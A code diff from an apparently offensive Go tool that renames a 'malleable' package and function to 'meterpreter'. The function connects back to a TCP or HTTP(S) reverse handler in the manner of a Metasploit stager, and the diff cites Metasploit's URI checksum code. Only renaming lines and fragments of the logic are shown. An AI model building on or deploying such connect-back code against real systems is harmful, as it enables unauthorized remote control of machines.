@@ -1,4 +1,4 @@
-package malleable
+package meterpreter
 
 import (
 	"crypto/tls"
@@ -10,12 +10,12 @@ import (
 	"runtime"
 	"time"
 
-	"github.com/m1ddl3w4r3/Gat/shell"
+	"github.com/m1ddl3w4r3/gat/shell"
 )
 
-// malleable function allows to connect back
+// Meterpreter function allows to connect back
 // to either a TCP or HTTP(S) reverse handler
-func Malleable(connType, address string) (bool, error) {
+func Meterpreter(connType, address string) (bool, error) {
 	var (
 		ok  bool
 		err error
@@ -41,7 +41,7 @@ func getRandomString(length int, charset string) string {
 	return string(buf)
 }
 
-// See https://github.com/rapid7/metasploit-framework/blob/7a6a124272b7c52177a540317c710f9a3ac925aa/lib/rex/payloads/malleable/uri_checksum.rb
+// See https://github.com/rapid7/metasploit-framework/blob/7a6a124272b7c52177a540317c710f9a3ac925aa/lib/rex/payloads/meterpreter/uri_checksum.rb
 func getURIChecksumID() int {
 	var res int = 0
 	switch runtime.GOOS {
